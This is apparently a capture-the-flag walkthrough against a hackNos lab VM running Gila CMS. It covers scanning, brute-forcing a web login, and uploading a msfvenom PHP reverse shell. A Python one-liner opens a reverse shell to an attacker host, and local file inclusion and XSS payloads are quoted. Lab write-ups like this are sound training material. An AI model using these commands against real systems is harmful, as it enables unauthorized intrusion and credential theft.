[*]
1. Discover host: nmap 172.16.16.0/24 -sn
MAC Address: 08:00:27:88:AD:32 (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.16.16.34
Host is up (0.00034s latency).
MAC Address: 08:00:27:FA:74:F9 (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.16.16.4
[*]
2. Scan host: nmap 172.16.16.34 -sV -A -p 22,80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 10:46 CST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WebSec
MAC Address: 08:00:27:FA:74:F9 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 172.16.16.34
[*]
3. Web enumeration: nikto -h 172.16.16.34 && dirb http://172.16.16.34 -a linux
+ Target IP:          172.16.16.34
+ Target Hostname:    172.16.16.34
+ Target Port:        80
+ Start Time:         2020-01-01 10:48:24 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /scripts/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /, inode: c3, size: 599925bee00f9, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
---- Scanning URL: http://172.16.16.34/ ----
+ http://172.16.16.34/index.html (CODE:200|SIZE:195)                                                                                                                                  
==> DIRECTORY: http://172.16.16.34/scripts/                                                                                                                                           
+ http://172.16.16.34/server-status (CODE:403|SIZE:277)                                                                                                                               
                                                                                                                                                                                      
---- Entering directory: http://172.16.16.34/scripts/ ----
[*]
4. Index.html shows "needing websec", and The http-title shows WebSec, so I investigated /websec. Found recursive directories, so I re-scanned it:
nitko -h http://172.16.16.34/websec
 Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Cookie PHPSESSID created without the httponly flag
+ /websec/admin/config.php: PHP Config file may contain database IDs and passwords.
+ /websec/admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) log file is readable remotely. Upgrade to the latest version.
+ /websec/admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
+ OSVDB-3233: /websec/admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
+ OSVDB-5034: /websec/admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify.
+ OSVDB-376: /websec/admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.
+ OSVDB-4804: /websec//admin/admin.shtml: Axis network camera may allow admin bypass by using double-slashes before URLs.
+ OSVDB-2813: /websec/admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
+ OSVDB-2842: /websec//admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra '/'. http://packetstorm.linuxsecurity.com/0310-exploits/FlexWATCH.txt
+ OSVDB-2922: /websec/admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.
+ OSVDB-3092: /websec/admin/: This might be interesting...
+ OSVDB-3092: /websec/login/: This might be interesting...
+ OSVDB-3093: /websec/admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/cfg/configscreen.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/cfg/configsql.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/cfg/configtache.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/cms/htmltags.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/credit_card_info.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/exec.php3: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/modules/cache.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/script.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/settings.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/templates/header.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /websec/admin/upload.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-4238: /websec/admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected.
+ OSVDB-4239: /websec/admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.
+ OSVDB-6666: /websec/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html: HP Instant TopTools GoAhead WebServer hpnst.exe may be vulnerable to a DoS.
+ OSVDB-9624: /websec/admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access.
+ OSVDB-3092: /websec/fm/: This might be interesting... potential country code (Federated States Of Micronesia)
+ /websec/admin/account.asp: Admin login page/section found.
+ /websec/admin/account.html: Admin login page/section found.
+ /websec/admin/account.php: Admin login page/section found.
+ /websec/admin/controlpanel.asp: Admin login page/section found.
+ /websec/admin/controlpanel.html: Admin login page/section found.
+ /websec/admin/controlpanel.php: Admin login page/section found.
+ /websec/admin/cp.asp: Admin login page/section found.
+ /websec/admin/cp.html: Admin login page/section found.
+ /websec/admin/cp.php: Admin login page/section found.
+ /websec/admin/home.asp: Admin login page/section found.
+ /websec/admin/home.php: Admin login page/section found.
+ /websec/admin/index.asp: Admin login page/section found.
+ /websec/admin/index.html: Admin login page/section found.
+ /websec/admin/login.asp: Admin login page/section found.
+ /websec/admin/login.html: Admin login page/section found.
+ /websec/admin/login.php: Admin login page/section found.
+ /websec/admin/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /websec/admin/status: Tomcat Server Status interface found (pass protected)
+ /websec/admin/sites/new: ComfortableMexicanSofa CMS Engine Admin Backend (pass protected)
+ 7892 requests: 0 error(s) and 58 item(s) reported on remote host
+ End Time:           2020-01-01 11:21:18 (GMT-6) (74 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
[*]
5. Found Hugeeeeee amount of false positives, but did find /websec/admin/admin.php?adminpy=1
[*]
6. Count't get default credentials, but did find login needed an email/pass. Lost pass shows backend type="Gila CMS"
[*]
7. searchsploit Gila
Gila CMS 1.9.1 - Cross-Site Scripting                                                                                                     
Gila CMS < 1.11.1 - Local File Inclusion
[*]
8. Exploit LFI
root@hostmachine:~/Downloads# cat /usr/share/exploitdb/exploits/multiple/webapps/47407.txt
# Exploit Title: Authenticated Local File Inclusion(LFI) in GilaCMS
# Google Dork: N/A
# Date: 04-08-2019
# Exploit Author: Sainadh Jamalpur
# Vendor Homepage: https://github.com/GilaCMS/gila
# Software Link: https://github.com/GilaCMS/gila
# Version: 1.10.9
# Tested on: XAMPP version 3.2.2 in Windows 10 64bit,
# CVE : CVE-2019-16679

*********** *Steps to reproduce the Vulnerability* *************

Login into the application as an admin user or equivalent user and go the
below link

http://localhost/gilacms/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts

[*]
9. Test un-authenticated LFI: http://172.16.16.34/websec/admin/fm/?f=src../../../../../../../../../etc/passwd
re-directed to login page. We need creds
[*]
10. Look at XSS exploit
root@hostmachine:~/Downloads# cat /usr/share/exploitdb/exploits/php/webapps/46557.txt
# Exploit Title: Gila CMS (search) Cross Site Scripting
# Google Dork: intext:"Powered By Gila CMS"
# Date: 11.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://gilacms.com
# Software Link: https://gilacms.com/packages/downloadRelease/1.9.1.zip
# Demo Site: https://gilacms.com/demo/
# Version: 1.9.1
# Tested on: Kali Linux
# CVE: CVE-2019-9647

# Vulnerable Parameter: search

# Payload: <--`<img/src=` onerror=confirm``> --!>

# GET Request: http://localhost/?search=<--`<img/src=` onerror=confirm``> --!>root@hostmachine:~/Downloads# 
[*]
11. Okay, so we know we need to login, but we dont have any users yet.
curl --url http://172.16.16.34/websec/index.html | grep .com
<link href="themes/startbootstrap-creative/vendor/fontawesome-free/css/all.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic" rel="stylesheet"><link href="themes/startbootstrap-creative/vendor/magnific-popup/magnific-popup.css" rel="stylesheet"><link href="themes/startbootstrap-creative/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="themes/startbootstrap-creative/css/creative.css" rel="stylesheet"></head><style>
          <h2 class="section-heading">www.hackNos.com</h2>
          <p class="mb-5">www.hackNos.com</p>
            <a href="mailto:your-email@your-domain.com">contact@hacknos.com</a>
[*]
12. Found user contact@hacknos.com. Lets generate a small wordlist to begin with: cewl http://172.16.16.34/websec -d 2 -w websec.txt --with-numbers
[*]
13. Looked at wordlist, it's honest so small it won't work. Lets check to see what we need to bruteforce the login page.
       <form role="form" method="post" action="" class="g-form wrapper g-card bg-white">
                <div class="form-group">
                    <input class="form-control fullwidth" placeholder="E-mail" name="username" type="email" autofocus>
                </div>
                <div class="form-group ">
                    <input class="form-control fullwidth" placeholder="Password" name="password" id="pass" type="password" value="">
                </div>
                <input type="submit" class="btn btn-primary btn-block" value="Login">
                        </form>
        <label class="helptext"><input type="checkbox" oninput="if(this.checked) pass.type='text'; else pass.type='password';"> Show password</label>
[*]
14. Bruteforce web-login: Built custom script to POST username/password
post_body = parse.urlencode({"username": user, "password": passwd.rstrip()})
oot@hostmachine:~# brute
Fail: contact@hacknos.com hackNos
Fail: contact@hacknos.com About
Fail: contact@hacknos.com and
Fail: contact@hacknos.com everything
Fail: contact@hacknos.com need
Fail: contact@hacknos.com Portfolio
Fail: contact@hacknos.com Security
Fail: contact@hacknos.com Start
Fail: contact@hacknos.com JavaScript
Success! User: contact@hacknos.com Password: Securityx
Fail: contact@hacknos.com Services
[*]
15. Login with found credentials: contact@hacknos.com/Securityx
[*]
16. In content>file manager, found config file
$GLOBALS['config'] = array (
  'db' =>
  array (
    'host' => 'localhost', # Database hostname, usually is localhost
    'user' => 'root', # The database user
    'pass' => '', # The database user's password
    'name' => 'gila', # The database name
  ),
[*]
17. Get shell:
  generate: msfvenom -p php/reverse_php LHOST=172.16.16.4 LPORT=4444 -f raw -o index.html
  upload: shell.php in the tmp folder
  start listener: msfconsole
		  use exploit/multi/handler
		  set LHOST 172.16.16.4
		  set LPORT 4444
		  exploit
  Kick off shell: http://172.16.16.34/websec/index.html
[*]
18. Move shell to new port: 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.16.4",123));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(["/bin/bash", "-i"])'
[*]
19. Found a hash in the user dir:
www-data@hacknos:/home/blackdevil$ ccaatt  uusseerr..ttxxtt

bae11ce4f67af91fa58576c1da2aad4b
[*]
20. Crack hash:
 identify: hash-identifier bae11ce4f67af91fa58576c1da2aad4b   **MD5**
 put hash in file: echo 'bae11ce4f67af91fa58576c1da2aad4b' > flag.hash
 crack: **didn't work**
[*]
21. Enumeration: sudo -l
/not/easy/What/are/you/looking
[*]
22. After some snooping (alot of snooping) I found an artifact:
www-data@hacknos:/var/local$ ccaatt  ddaattaabbaassee

Expenses
Software Licenses,$2.78
Maintenance,$68.87
Mortgage Interest,$70.35
Advertising,$9.78
Phone,$406.80
Insurance,$9.04
Opss;fackespreadsheet
[*]
23. When I googled fakespreadsheet, it appears to be an encoding type. I decoded it:
http://www.spammimic.com/spreadsheet.php?action=decode
Security@x@
[*]
24. Im guessing a password. I tried to SSH as user blackdevil, and success!
[*]
25. Enumerate user: sudo -l
blackdevil@hacknos:~$ sudo -l
[sudo] password for blackdevil: 
Sorry, try again.
[sudo] password for blackdevil: 
Matching Defaults entries for blackdevil on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User blackdevil may run the following commands on hacknos:
    (ALL : ALL) ALL
[*]
26. Get flag!
blackdevil@hacknos:~$ sudo su -
root@hacknos:~# ls
root.txt  snap
root@hacknos:~# cat root.txt
########    #####     #####   ########         ########  
##     ##  ##   ##   ##   ##     ##            ##     ## 
##     ## ##     ## ##     ##    ##            ##     ## 
########  ##     ## ##     ##    ##            ########  
##   ##   ##     ## ##     ##    ##            ##   ##   
##    ##   ##   ##   ##   ##     ##            ##    ##  
##     ##   #####     #####      ##    ####### ##     ##


MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut
[*]
